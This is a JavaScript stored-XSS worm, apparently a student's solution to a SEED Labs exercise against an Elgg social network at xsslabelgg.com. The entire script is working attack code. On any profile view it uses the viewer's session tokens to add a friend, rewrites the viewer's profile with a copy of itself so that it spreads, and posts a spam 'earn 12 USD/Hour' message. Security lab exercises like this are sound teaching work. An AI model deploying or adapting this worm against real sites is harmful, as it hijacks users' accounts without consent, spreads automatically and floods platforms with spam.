<script id="worm" type="text/javascript">
window.onload = function () {
	//*** just incorporated first three task so they can work together ... interesting part was I had to add id element in my code... which was a huge realization
	// here i had to hard code task1's url as this time the visited profile might not be samy but the request should go to samy***	
	if(elgg.session.user.guid!=elgg.page_owner.guid)
	{
		//alert('XSS');
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
				


		//Construct the HTTP request to add Samy as a friend.
		var sendurl1 = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;
		//console.log(sendurl);
	
	

		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		/*Ajax.onreadystatechange = function() {
				//if (xhr.readyState === 4) {
				 // callback(xhr.response);
				//}
				console.log(Ajax.readyState);
				console.log(Ajax.response);			
		}*/	
		Ajax.open("GET",sendurl1,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();



		var guid = "&guid="+elgg.session.user.guid;
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
		var jsCode = document.getElementById("worm").innerHTML;
		var tailTag = "</" + "script>";
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
		console.log(wormCode);
		//Construct the content of your url.
		var sendurl2="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
		var content2=ts+token+"&name=seed+ubuntu&description="+wormCode+"&accesslevel%5Bdescription%5D=1&briefdescription=1605062&accesslevel%5Bbriefdescription%5D=1&location=seed+ubuntu&accesslevel%5Blocation%5D=1&interests=seed+ubuntu&accesslevel%5Binterests%5D=1&skills=seed+ubuntu&accesslevel%5Bskills%5D=1&contactemail=killmeh%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=seed+ubuntu&accesslevel%5Bphone%5D=1&mobile=seed+ubuntu&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fwww.killmeh.com%2Fwebsite&accesslevel%5Bwebsite%5D=1&twitter=seed+ubuntu&accesslevel%5Btwitter%5D=1"+guid //FILL IN

		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl2,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content2);

		

		var sendurl3="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
		var profileLink =encodeURIComponent(elgg.session.user.url);
		var content3=token+ts+"&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0A"+profileLink; //FILL IN
		

		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl3,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content3);
	





	}
	
}
</script>

